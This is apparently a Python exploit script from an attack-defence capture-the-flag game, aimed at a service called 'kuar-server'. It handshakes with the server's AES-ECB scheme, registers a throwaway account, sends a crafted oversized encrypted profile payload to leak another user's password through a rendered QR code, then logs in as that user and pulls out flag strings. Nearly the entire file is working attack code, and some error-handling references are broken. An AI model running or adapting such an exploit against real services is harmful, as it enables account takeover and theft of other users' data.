#!/usr/bin/env python3

from pwn import *
from Crypto.Cipher import AES
import os
from PIL import Image
from pyzbar.pyzbar import decode
import re

import sys
import os
import tempfile

# SETTINGS

BINARY = "./kuar-server"

IP = 'localhost'
PORT = 9999

# SPLOIT #
DEFAULT_RECV_SIZE = 4096
TCP_CONNECTION_TIMEOUT = 15
TCP_OPERATIONS_TIMEOUT = 15
stable = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]


class CheckMachine:
    sock = None

    def __init__(self, cl_socket):
        self.port = PORT
        self.sock = cl_socket

        self.init_keys()
        self.init_cipher_ctx()

    def init_keys(self):
        packet_key = os.urandom(64)
        self.encryption_key = b''

        for i in range(0, 64, 2):
            self.encryption_key += bytes([stable[packet_key[i]] ^ stable[packet_key[i + 1]]])

        self.sock.send(packet_key)

    def init_cipher_ctx(self):
        self.ctx = AES.new(self.encryption_key, AES.MODE_ECB)
    
    def pad(self, packet):
        pad_byte = 16 - (len(packet) % 16)
        packet = packet + bytes([pad_byte] * pad_byte)
        return packet
    
    def unpad(self, packet):
        pad_byte = packet[-1]
        
        if pad_byte > 0x10:
            return packet

        if packet[-pad_byte:] == bytes([pad_byte]*pad_byte):
            packet = packet[:-pad_byte]
        return packet

    def encrypt(self, packet):
        packet = self.pad(packet)
        encPacket = self.ctx.encrypt(packet)
        return encPacket
    
    def decrypt(self, packet):
        decPacket = self.ctx.decrypt(packet)
        decPacket = self.unpad(decPacket)
        return decPacket
    
    def send(self, data):
        #print("send: ", data)
        data = self.encrypt(data)
        nbytes = self.sock.send(data)
        return nbytes

    def recv(self, size):
        data = self.sock.recv(size)
        data = self.decrypt(data)
        #print("recv: ", data)
        return data

    def register(self, username: str, password: str):
        packet = self.recv(DEFAULT_RECV_SIZE)
        self.send(b"2")
        packet = self.recv(DEFAULT_RECV_SIZE)
        
        self.send(username.encode())
        packet = self.recv(DEFAULT_RECV_SIZE)

        self.send(password.encode())
        self.recv(DEFAULT_RECV_SIZE) # get menu

    def update_profile(self, data: str):
        self.send(b"2")
        self.recv(DEFAULT_RECV_SIZE)
        self.send(data)
        self.recv(DEFAULT_RECV_SIZE) # get menu

    def view_profile(self):
        self.send(b"1")
        data = self.recv(DEFAULT_RECV_SIZE)
        self.recv(DEFAULT_RECV_SIZE) # get menu
        return data

    def get_qr(self):
        self.send(b"3")
        data = b''

        while True:
            self.sock.settimeout(0.8)
            try:
                tmp = self.sock.recv(16)
                #print(tmp)
                if tmp == b'':
                    break

                data += tmp
            except:
                break
        

        data = self.decrypt(data)
        if len(data) == 0:
            self.c.cquit(status, "Can't get QR-code",
                "data is empty")

        data = data.split(b'\n')[:-6]
        #print(data)

        pixels = []

        for line in data:
            pixel_line = []
            for i in line:
                if i == 0x20:
                    pixel_line.append((255, 255, 255))
                else:
                    pixel_line.append((0, 0, 0))
            pixels.append(pixel_line)

        if len(pixels) < 4 or len(pixels[0]) < 4:
            self.c.cquit(status, "Invalid QR-code format",
                "Pixels is to small")

        imgSize = (len(data), len(pixels[0]))

        img = Image.new('RGB', imgSize)
        img_pixels = img.load()

        for i in range(0, imgSize[0]):
            for j in range(0, imgSize[1]):
                img_pixels[i, j] = pixels[i][j]

        _, qr_path = tempfile.mkstemp(suffix='.png')

        img.save(qr_path)
        return qr_path

    def login(self, username: str, password: str):
        packet = self.recv(DEFAULT_RECV_SIZE)
        self.send(b"1")
        packet = self.recv(DEFAULT_RECV_SIZE)
        self.send(username.encode())
        packet = self.sock.recv(DEFAULT_RECV_SIZE)

        self.send(password.encode())
        self.sock.recv(DEFAULT_RECV_SIZE) # get menu


if __name__ == "__main__":

    if len(sys.argv) > 2:
        IP = sys.argv[1]
        ATTACKED_USERNAME = sys.argv[2]
    else:
        print("[-] Usage: ./remote_sploit.py <host> <username>")
        sys.exit(0)

    r = remote(IP, PORT)
    cl  = CheckMachine(r)
    username = os.urandom(3).hex()
    password = os.urandom(3).hex()

    cl.register(username, password)
    cl.sock.close()

    r = remote(IP, PORT)
    cl  = CheckMachine(r)

    cl.login(ATTACKED_USERNAME, 'c')
    cl.login(username, password)

    cl.send(b"2")
    cl.recv(4096)
    packet = cl.ctx.encrypt(b'fa12bed303d0da9782ada4e1196d1ec2|d34258c28928e9c3b4a323ee9de5d338|1f5f8f170d64e1d9a5cbf89c01a503dd|c7a068a7d459ba9b953556aa47fb1abb|2129bec1689619746d3f02f54724ddf7|abd'.ljust(252-16, b'a') + b'\x80'*4)
    cl.sock.send(packet)
    cl.recv(1024)

    qr_path = cl.get_qr()

    decodeQr = process(["zbarimg", qr_path]).recvall()

    qr_start = decodeQr.index(b'QR-Code:')
    if qr_start == -1:
        print("err")
        sys.exit(0)

    ATTACKED_USER_PASSWORD = decodeQr[qr_start+8:][0x124:0x124+24].decode()
    cl.sock.close()

    r = remote(IP, PORT)
    cl  = CheckMachine(r)
    cl.login(ATTACKED_USERNAME, ATTACKED_USER_PASSWORD)
    qr_path = cl.get_qr()
    decodeQr = process(["zbarimg", qr_path]).recvall().decode()
    print(re.findall(r"[0-9A-Z]{31}=", decodeQr))
    cl.sock.close()
